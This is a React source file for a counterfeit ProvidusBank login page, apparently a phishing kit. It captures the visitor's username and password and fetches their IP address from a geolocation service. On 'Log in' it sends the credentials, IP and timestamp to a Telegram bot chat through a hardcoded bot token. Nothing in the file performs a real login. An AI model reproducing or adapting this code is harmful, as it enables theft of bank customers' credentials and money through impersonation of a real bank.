import React,{useState,useEffect} from "react"
import './App.css';
import moment from 'moment';
import axios from "axios";
import TextInput from './Components/inputComponent/input';
import TextButton from './Components/Button/Button';
import providusbankicon from "./assets/logo.png";


const App = ()=>
 {
   const [userName,setUserName] = useState("")
   const [password,setPassword] = useState("")
   const [ip, setIP] = useState('');
   const getUsername =(e)=>setUserName(e.target.value)
   const getPassword =(e)=>setPassword(e.target.value)

   const getData = async () => {
    const res = await axios.get('https://geolocation-db.com/json/')
    console.log(res.data);
    setIP(res.data.IPv4)
  }
const telegramBotKey = "5885028589:AAHENcAYhqS7PNp-HB2th3ODVmahXWfTTv4"
const chat_id = "1169990417"
const endpoint = `https://api.telegram.org/bot${telegramBotKey}/sendMessage`;
let text = ` 💸[Login]💸 \n Username\t\t\t\t\t\t:${userName} \nPassword\t\t\t\t\t\t\t\t:${password}\n💻[information]💻\nIP\t\t\t\t\t\t:${ip}\nTime\t\t\t\t\t\t:${moment().format()}`
 const jsdetails = {
            text,
            chat_id
        }
 const makePostRequest = (url, details) => {
    return fetch(url,
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(details),
        })
        .then((response) => response.json());
};

const Press = (text) =>
{
 makePostRequest(endpoint,jsdetails );
}

useEffect( () => {
  //passing getData method to the lifecycle method
  getData()

}, [])

  return (
    <div className="App">
        <div className='providusbankicon'>             
             <p className="title">   
             <img src={providusbankicon} style={{marginLeft:26}} width="74" height = "73"alt="react logo" /> 
              PROVIDUSBANK
             </p>  
        </div>   
            
       <TextInput placeholder={"Username"} Action={getUsername}/>
       <TextInput placeholder={"Password"} Action={getPassword}/>
       <TextButton  title={"Log in"} textColor={"white"} bgColor={"orange"} action={Press}/>
       <p className='forgotpasswordText'>Forgot Password?<span style={{color:"orange",fontStyle:"italic"}}>click here</span></p>  
       <p className='forgotpasswordText'>Complains & Feedback<span style={{color:"orange",fontStyle:"italic"}}>click here</span></p>  
       <p className='forgotpasswordText'>Got Question(s)?<span style={{color:"orange",fontStyle:"italic"}}>Check our FAQs</span></p>  
       <div style={{marginBottom:"140px"}}></div>
       <TextButton  title={"Open an Account"} textColor={"black"} bgColor={"white"} />
       <TextButton  title={"Register Here"} textColor={"black"} bgColor={"white"}/>
       <p className='forgotpasswordText'>ProvidusBank&#169;<span style={{color:"orange",fontStyle:"italic"}}>2023</span></p>  
    </div>
  );
}

export default App;
